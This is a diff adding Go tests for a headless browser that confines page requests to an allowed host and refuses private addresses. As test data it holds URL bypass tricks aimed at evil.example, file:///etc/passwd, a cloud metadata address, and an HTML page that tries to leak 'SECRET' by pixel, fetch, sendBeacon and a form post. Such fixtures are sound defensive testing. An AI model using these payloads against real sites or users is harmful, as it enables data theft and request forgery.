@@ -9,7 +9,9 @@ import (
 	"os/exec"
 	"runtime"
 	"strings"
+	"sync"
 	"testing"
+	"time"
 )
 
 func chrome(t *testing.T) {
@@ -57,7 +59,7 @@ func TestBrowseFillAndSubmit(t *testing.T) {
 	// The other site is reached as localhost, this one as 127.0.0.1.
 	elsewhere := strings.Replace(other.URL, "127.0.0.1", "localhost", 1)
 	srv := site(t, elsewhere)
-	b := &Browser{Profile: t.TempDir()}
+	b := &Browser{Profile: t.TempDir(), AllowPrivate: true}
 	defer b.Close()
 	ctx := context.Background()
 	only := func(h string) bool { return h == "127.0.0.1" }
@@ -113,5 +115,104 @@ func TestBrowseFillAndSubmit(t *testing.T) {
 	}
 	if _, err := b.Open(ctx, "run1", elsewhere+"/x", only); err == nil {
 		t.Fatal("opened a page out of scope")
+	}
+}
+
+func TestVetDecidesEachRequest(t *testing.T) {
+	only := func(h string) bool { return h == "shop.example" }
+	public := func(string) bool { return false }
+	for raw, ok := range map[string]bool{
+		"https://shop.example/cart":              true,
+		"https://SHOP.example/cart":              true,
+		"https://cdn.example/app.js":             false,
+		"https://shop.example:x@evil.example/":   false,
+		"https://shop.example@evil.example/":     false,
+		"ws://shop.example/socket":               false,
+		"file:///etc/passwd":                     false,
+		"http://shop.example.evil.example/steal": false,
+	} {
+		if err := vet(raw, only, public); (err == nil) != ok {
+			t.Errorf("vet(%q) = %v", raw, err)
+		}
+	}
+	if vet("https://shop.example/", nil, public) == nil {
+		t.Error("a tab with no scope let a request go")
+	}
+	if vet("https://shop.example/", only, func(string) bool { return true }) == nil {
+		t.Error("a private address was let through")
+	}
+	b := &Browser{}
+	for _, h := range []string{"127.0.0.1", "localhost", "10.0.0.1", "169.254.169.254", "100.100.100.100", "::ffff:127.0.0.1"} {
+		if !b.private(h) {
+			t.Errorf("%s is not private", h)
+		}
+	}
+}
+
+// Nothing a page asks for leaves for another host: not its images or
+// scripts, not a fetch, not a form posted elsewhere. Only the page's own
+// requests reach it.
+func TestRequestsOutsideScopeNeverLeave(t *testing.T) {
+	chrome(t)
+	var mu sync.Mutex
+	var leaked []string
+	other := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		mu.Lock()
+		leaked = append(leaked, r.Method+" "+r.URL.String())
+		mu.Unlock()
+		fmt.Fprint(w, "<title>fora</title>")
+	}))
+	defer other.Close()
+	elsewhere := strings.Replace(other.URL, "127.0.0.1", "localhost", 1)
+	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		w.Header().Set("Content-Type", "text/html; charset=utf-8")
+		fmt.Fprintf(w, `<title>Loja</title><img src="%[1]s/pixel?d=SECRET"><script src="%[1]s/x.js"></script>
+<script>fetch(%[1]q + '/api?d=SECRET', {mode: 'no-cors'}).catch(() => {}); navigator.sendBeacon(%[1]q + '/beacon', 'SECRET');</script>
+<form method="post" action="%[1]s/steal"><input name="d" value="SECRET"><button type="submit">Enviar</button></form>`, elsewhere)
+	}))
+	defer srv.Close()
+	b := &Browser{Profile: t.TempDir(), AllowPrivate: true}
+	defer b.Close()
+	ctx := context.Background()
+	only := func(h string) bool { return h == "127.0.0.1" }
+	p, err := b.Open(ctx, "run1", srv.URL+"/", only)
+	if errors.Is(err, ErrNoSandbox) || HeadlessHangsHere(err) {
+		t.Skip(err)
+	}
+	if err != nil || p.Title != "Loja" {
+		t.Fatalf("%+v %v", p, err)
+	}
+	ref := 0
+	for _, e := range p.Elements {
+		if e.Kind == "button" {
+			ref = e.Ref
+		}
+	}
+	if _, err := b.Click(ctx, "run1", ref, only); err == nil || !strings.Contains(err.Error(), "outside") {
+		t.Fatalf("a form posted elsewhere: %v", err)
+	}
+	time.Sleep(300 * time.Millisecond)
+	mu.Lock()
+	defer mu.Unlock()
+	if len(leaked) > 0 {
+		t.Fatalf("requests reached another host: %v", leaked)
+	}
+}
+
+// Without the test switch the browser reaches no private address, even
+// one the run's scope names.
+func TestBrowserRefusesPrivateAddresses(t *testing.T) {
+	chrome(t)
+	hit := false
+	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { hit = true }))
+	defer srv.Close()
+	b := &Browser{Profile: t.TempDir()}
+	defer b.Close()
+	_, err := b.Open(context.Background(), "run1", srv.URL+"/", func(h string) bool { return h == "127.0.0.1" })
+	if errors.Is(err, ErrNoSandbox) || HeadlessHangsHere(err) {
+		t.Skip(err)
+	}
+	if err == nil || hit {
+		t.Fatalf("reached a loopback address: %v", err)
 	}
 }
